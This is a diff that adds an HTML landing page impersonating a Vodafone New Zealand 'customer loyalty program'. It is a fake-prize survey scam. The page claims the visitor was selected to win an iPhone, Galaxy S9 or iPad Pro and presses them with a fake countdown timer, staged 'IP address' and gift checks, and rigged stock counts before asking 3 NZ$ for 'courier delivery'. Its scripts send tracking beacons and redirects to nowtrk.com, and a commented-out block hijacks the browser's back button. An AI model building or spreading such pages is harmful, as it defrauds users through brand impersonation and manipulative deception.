@@ -1,0 +1,578 @@
+<!DOCTYPE html><html lang="en"><head>
+  <base href="">
+
+<meta name="referrer" content="never">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- <noscript>&lt;img src="https://nowtrk.com/click.php?lp=data_upd&amp;event4=1" height="1" width="1" style="display:none" /&gt;</noscript>
+<script>
+function token(v)
+{
+var o = document.createElement("img");
+o.src='https://now'+'trk.com/click.php?lp=data_upd&'+v;
+}
+</script>
+<script type="text/javascript">
+if (typeof(window.orientation)=="undefined") { token("event4=1"); }
+else { token("event2=1&event4=1"); }
+</script>
+<script type="text/javascript">
+var bc = 0; 
+!function(){var d;try{for(d=0;30>d;++d){history.pushState({},"","#")}onpopstate=function(a){if(bc==0){token("event1=1");bc=1;}}}catch(c){}}();
+</script> -->
+<script> function gotoUrl(){ location.href = "https://now"+"trk.com/click.php?lp=1&event3=1"; }</script>
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
+<meta name="description" content="">
+<meta name="author" content="">
+<title>Vodafone customer loyalty program</title>
+<link rel="stylesheet" href="bootstrap.min.css">
+<link rel="stylesheet" href="vodafone-bundle.css">
+<script src="jquery.min.js"></script>
+<script src="bootstrap.min.js"></script>
+<script type="text/javascript">
+var Helper = (function() {
+
+	var data = [];
+
+	var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+	var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+
+	function setDays(d) {
+		if ((d.constructor !== Array) || d.length !== 7)
+			return false;
+
+		days = d;
+	}
+
+	function setMonths(m) {
+		if ((m.constructor !== Array) || m.length !== 12)
+			return false;
+
+		months = m;
+	}
+
+	function getDate() {
+		var now = new Date();
+		var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+		return (now.getDate()) + " " + month + " " + now.getFullYear();
+	}
+
+	function getMonth() {
+		var now = new Date();
+		var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+		return month;
+	}
+
+	function getDay() {
+		var now = new Date();
+		var day = typeof(days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+		return day;
+	}
+
+	function getDayOfMonth() {
+		var now = new Date();
+		var day = ('0' + now.getDate()).slice(-2);
+		return day;
+	}
+
+	// function getUrlParameter(name) {
+	// 	name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+	// 	var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+	// 	var results = regex.exec(location.search);
+	// 	return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+	// }
+
+	function findAncestor(element, name) {
+		while ((element = element.parentElement) && !element.classList.contains(name));
+		return element;
+	}
+
+	function bindOnQuery(query, callback, action = 'click') {
+		var elements = document.querySelectorAll(query);
+		for (var i = 0; i < elements.length; i++) {
+			elements[i].addEventListener(action, callback, false);
+		}
+	}
+
+	function bindOnId(name, callback, action = 'click') {
+		var element = document.getElementById(name);
+		element.addEventListener(action, callback, false);
+	}
+
+	// function replaceMarkers(text, markers) {
+	// 	for (key in markers) {
+	// 		var search = '%'+ key +'%';
+	// 		text = text.replace(new RegExp(search, 'g'), markers[key]);
+	// 	}
+
+	// 	return text;
+	// }
+
+	return {
+		setDays: setDays,
+		setMonths: setMonths,
+		getDate: getDate,
+		getDay: getDay,
+		getMonth: getMonth,
+		getDayOfMonth: getDayOfMonth,
+		// getUrlParameter: getUrlParameter,
+		findAncestor: findAncestor,
+		bindOnQuery: bindOnQuery,
+		bindOnId: bindOnId,
+		// replaceMarkers: replaceMarkers
+	};
+
+})();
+</script>
+</head>
+<body class="modal-open">
+	<!-- <div class="tingle-modal" style="display: none;">
+		<div class="tingle-modal-box">
+			<div class="tingle-modal-box__content"></div>
+			<div class="tingle-modal-box__footer">
+				<button></button>
+			</div>
+		</div>
+	</div>
+ <div class="tingle-modal" style="display: none;">
+	<div class="tingle-modal-box">
+		<div class="tingle-modal-box__content"></div>
+		<div class="tingle-modal-box__footer">
+			<button></button>
+		</div>
+	</div>
+ </div> -->
+
+<div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="display: block;">
+	<div class="modal-dialog">
+		<div class="modal-content">
+		<div class="modal-body">
+			<br>
+			<table><tbody>
+			<tr><td>
+				<img src="vodafone-logo.png" class="logo-main">
+				<p style="font-size:10.5pt"><strong><script>document.write(Helper.getDate())</script></strong></p><br>
+				<p><b>Dear Vodafone client:</b></p><br>
+				<p>Congratulations! You are one of the 100 users that we selected to receive the chance to win an <b>Samsung Galaxy S9</b>, <b>iPhone XS</b> or <b>iPad Pro</b>.</p><br>
+			</td></tr>
+			</tbody></table>
+		</div>
+		<div class="modal-footer">
+			<img src="vodafone-line.png" alt="" class="modal-line">
+			<button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
+		</div>
+		</div>
+	</div>
+</div>
+
+
+
+
+
+<header>
+	<div class="logo-wrap">
+		<div class="container">
+			<div class="row">
+				<div class="col-xs-12 col-md-8 col-md-offset-2 ">
+					<table style="width: 100%;"><tbody>
+					<tr>
+						<td class="logo">
+							<img id="logo" class="clickable" src="vodafone-logo.png">
+						</td>
+						<td class="lang">
+						</td>
+					</tr>
+					</tbody></table>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="slogan-wrap">
+		<div class="container">
+			<div class="row">
+				<div class="col-xs-12 col-md-8 col-md-offset-2 slogan text-xs-left">
+					Vodafone customer loyalty program
+				</div>
+			</div>
+		</div>
+	</div>
+</header>
+
+<div class="container body-container">
+	<div class="row">
+		<div class="lead-container col-xs-12 col-md-8 col-md-offset-2">
+			<div id="recipe-row" class="row">
+				<div class="col-xs-12 recipe-content">
+					<div class="row">
+						<div class="col-xs-1">
+							<div class="icon-round" style="background: url(vodafone-ico.png) no-repeat;"></div>
+						</div>
+						<div class="col-xs-10 col-md-11">
+							<div class="recipe-header">
+								<div class="phrase">
+									Congratulations!
+								</div>
+								<div class="date_full">
+									<script>document.write(Helper.getDate())</script>
+								</div>
+							</div>
+						</div>
+					</div>
+					We would like to thank you for using our services for so long!<br><br>
+					Every day we select a small group of Vodafone users and give them the opportunity to receive valuable gifts from our partners and sponsors. So we want to thank you for choosing to use Vodafone.<br><br>
+					You can win a new <span class="marked">Samsung Galaxy S9</span>, <span class="marked">iPhone XS</span> or <span class="marked">iPad Pro</span>. All you need to do to get a gift is answer the following 8 questions. This survey allows us to better understand users and improve our products. It does not take more than 30 seconds of your time.<br><br>
+					<strong>Remember:</strong> 100 randomly selected users received this invitation, and the number of gifts is limited.
+					<div class="timer">
+						You have <span class="marked"><span id="timer-mins">3</span> minutes and <span id="timer-secs">49</span> seconds</span> to answer the following questions before we give the gift to another lucky person among our users! Good luck!
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="row">
+		<div class="qu-wrap col-xs-12 col-md-8 col-md-offset-2 ">
+			<div class="">
+				<div class="qu-group col-xs-12">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							Which device are you currently using?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							PC / Notebook
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+						   Smartphone
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Tablet
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Other
+						</div>
+					</div>
+				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							What operating system are you using on your device?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Microsoft Windows
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Apple MacOS
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Android
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Apple iOS
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Other
+						</div>
+					</div>
+				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							How often do you use the Internet on your mobile phone/smartphone?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Regularly
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Sometimes
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Not use
+						</div>
+					</div>
+				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							How often do you change your phone to a new one?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Once every six months
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Once a year
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Once every few years
+						</div>
+					</div>
+				</div>
+
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+						What other operators do you use?
+						</div>
+					</div>
+											<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+								I only use Vodafone							</div>
+						</div>							<div class="row">
+								<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+								2degrees								</div>
+							</div>							<div class="row">
+								<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+								Spark								</div>
+							</div>							<div class="row">
+								<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+								Vocus								</div>
+							</div>						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+								Other
+							</div>
+						</div>				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							Are you satisfied with the quality of communication provided by Vodafone?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Completely satisfied
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Satisfied
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Not satisfied
+						</div>
+					</div>
+				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							How old are you?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Under 18
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							18-25
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							26-34
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							35-54
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							55-64
+						</div>
+					</div>
+				</div>
+				<div class="qu-group col-xs-12" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							What is your gender?
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Male 
+						</div>
+					</div>
+					<div class="row">
+						<div class="qu col-xs-12 col-md-8 col-md-offset-2">
+							Female
+						</div>
+					</div>
+				</div>
+				<div id="qu-progress" class="col-xs-12" style="display: none;">
+					<div class="row">
+						<div id="qu-progress-state" class="col-xs-6 col-md-4 col-md-offset-2 text-left">
+							Progress
+						</div>
+						<div id="qu-progress-percent" class="col-xs-6 col-md-4 text-right">
+							0%
+						</div>
+					</div>
+					<div class="row">
+						<div class="col-xs-12 col-md-8 col-md-offset-2 qu-progress-wrap">
+							<div id="qu-progress-bar">
+							</div>
+						</div>
+					</div>
+					<div class="row">
+						<div id="qu-checkpoint-10" rel="Verification of answers" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+							<table>
+								<tbody><tr>
+									<td>
+										<div id="qu-mark-10" class="qu-mark"></div>
+									</td>
+									<td>
+									  <span class="qu-checkpoint-desc">You answered all the questions (8/8)</span>
+									</td>
+								</tr>
+							</tbody></table>
+						</div>
+					</div>
+					<div class="row">
+						<div id="qu-checkpoint-20" rel="Check the IP address" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+							<table>
+								<tbody><tr>
+									<td>
+										<div id="qu-mark-20" class="qu-mark"></div>
+									</td>
+									<td>
+										<span class="qu-checkpoint-desc">No records with your IP address</span>
+									</td>
+								</tr>
+							</tbody></table>
+						</div>
+					</div>
+					<div class="row">
+						<div id="qu-checkpoint-30" rel="Checking the availability of gifts" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+							<table>
+								<tbody><tr>
+									<td>
+										<div id="qu-mark-30" class="qu-mark"></div>
+									</td>
+									<td>
+										<span class="qu-checkpoint-desc">1 gift available</span>
+									</td>
+								</tr>
+							</tbody></table>
+						</div>
+					</div>
+				</div>
+				<div id="qu-prize" class="col-xs-12 col-md-8 col-md-offset-2" style="display: none;">
+					<div class="row">
+						<div class="qu-group-header col-xs-12">
+							Receive your gift now:
+						</div>
+					</div>
+					<div class="row qu-prize-row">
+						<div class="col-xs-4 text-xs-right qu-item">
+							<img class="prize-image clickable" src="iphonex.png">
+						</div>
+						<div class="col-xs-7 text-xs-left qu-prize-description">
+							<p class="qu-prize-name clickable">iPhone XS</p>
+							<p><strong>Your price:</strong><span class="qu-yourprice-value"> 3 NZ$ (Cost of courier delivery)</span></p>
+							<p id="remaining"><strong>Available:</strong> <span id="remainingCount">3</span></p>
+							<p><a href="javascript:void(0)" class="qu-take-it">Choose</a></p>
+						</div>
+					</div>
+					<div class="row qu-prize-row qu-opacied">
+						<div class="col-xs-4 text-xs-right qu-item">
+							<img class="prize-image" src="samsung9.png">
+						</div>
+						<div class="col-xs-7 text-xs-left qu-prize-description">
+							<p class="qu-prize-name">Samsung Galaxy S9</p>
+							<p><strong>Your price:</strong> 3 NZ$ (Cost of courier delivery)</p>
+							<p><strong>Available:</strong> 0</p>
+							<p class="qu-btn-dis">Out of stock</p>
+						</div>
+					</div>
+					<div class="row qu-prize-row qu-opacied">
+						<div class="col-xs-4 text-xs-right qu-item">
+							<img class="prize-image" src="ipad.png">
+						</div>
+						<div class="col-xs-7 text-xs-left qu-prize-description">
+							<p class="qu-prize-name">iPad Pro</p>
+							<p><strong>Your price:</strong> 3 NZ$ (Cost of courier delivery)</p>
+							<p><strong>Available:</strong> 0</p>
+							<p class="qu-btn-dis">Out of stock</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="container">
+	<div class="row">
+		<div class="col-xs-12 col-md-8 col-md-offset-2 copyright text-xs-center" style="padding-top:10px;">
+			© Vodafone 2018
+
+			<div class="copyright-image img-responsive">
+				<img src="rta.gif">
+			</div>
+			<div class="conditions">
+				<a href="javascript:void(0)">Conditions</a>
+			</div>
+
+		</div>
+	</div>
+</div>
+<div style="display: none;">
+	<div class="jingle-header-crutch">
+		<table>
+			<tbody><tr>
+				<td><img src="vodafone-ico_2.png" alt=""></td>
+				<td class="slogan"><span class="marked">Vodafone customer loyalty program</span></td>
+			</tr>
+		</tbody></table>
+	</div>
+</div>
+<script>
+	window.onload=function(){
+		// if( getCookie("sp") != "1" ) 
+		$('#myModal').modal('show');
+	};
+	</script>
+
+<script src="bundle.js"></script>
+<!-- <script>
+function alertUser(msg) {
+	alert(msg);
+}
+</script> -->
+
+<!-- <div class="modal-backdrop fade in"></div></body> -->
+</html>
